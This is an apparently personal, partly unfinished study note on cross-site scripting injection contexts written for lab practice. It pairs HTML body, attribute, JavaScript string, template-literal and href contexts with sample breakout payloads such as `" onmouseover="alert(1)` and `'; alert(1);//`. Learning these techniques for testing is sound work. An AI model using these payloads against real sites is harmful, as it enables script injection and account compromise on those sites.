# XSS Contexts

> 🚧 This section is partially complete. Advanced context labs will be revisited after strengthening JavaScript knowledge.

---

## What is an "Injection Context"?

The context is **where exactly in the HTML/JS your input lands**. The same payload won't work in every context — you need to adapt based on where you are.

---

## Context 1: HTML Body Context

Your input lands directly in the HTML body.

```html
<p>Hello, [YOUR INPUT]</p>
```

**No encoding → basic payload works:**
```html
<script>alert(1)</script>
```

**Labs completed:** Reflected XSS + Stored XSS (nothing encoded) ✅

---

## Context 2: HTML Attribute Context

Your input lands inside an HTML attribute.

```html
<input value="[YOUR INPUT]">
```

**If angle brackets are encoded (`<` → `&lt;`):**
- `<script>` won't work
- But you can break out of the attribute with `"` and inject an event handler:

```
" onmouseover="alert(1)
```

**Result:**
```html
<input value="" onmouseover="alert(1)">
```

**Labs:** 🚧 To be completed
- Reflected XSS into attribute with angle brackets HTML-encoded
- Stored XSS into anchor href attribute with double quotes HTML-encoded

---

## Context 3: JavaScript String Context

Your input lands inside a JavaScript string.

```html
<script>
    var search = '[YOUR INPUT]';
</script>
```

**Goal:** Break out of the string and inject JS.

**If only angle brackets are encoded:**
```
'; alert(1); var x='
```

**Result:**
```javascript
var search = ''; alert(1); var x='';
```

**Labs:** 🚧 To be completed
- Reflected XSS into JS string with angle brackets HTML-encoded
- Reflected XSS into JS string with single quote and backslash escaped
- Reflected XSS into JS string with angle brackets + double quotes encoded and single quotes escaped

---

## Context 4: Template Literal Context

Your input lands inside a JavaScript template literal (backtick string).

```javascript
var message = `Hello, [YOUR INPUT]`;
```

Template literals evaluate `${}` expressions:
```
${alert(1)}
```

**Result:**
```javascript
var message = `Hello, ${alert(1)}`;
```

**Lab:** 🚧 To be completed
- Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped

---

## Summary Table

| Context | Breaks with | Payload type |
|---|---|---|
| HTML body | nothing | `<script>` or `<img onerror=>` |
| HTML attribute | `"` | `" onmouseover="alert(1)` |
| JS string | `'` or `"` | `'; alert(1);//` |
| Template literal | `${` | `${alert(1)}` |
| href attribute | nothing (if unencoded) | `javascript:alert(1)` |

---

> 📌 **Note:** The ability to exploit these contexts depends on understanding exactly how JavaScript and HTML parse strings and encoding. These labs will be completed after advancing JavaScript skills.
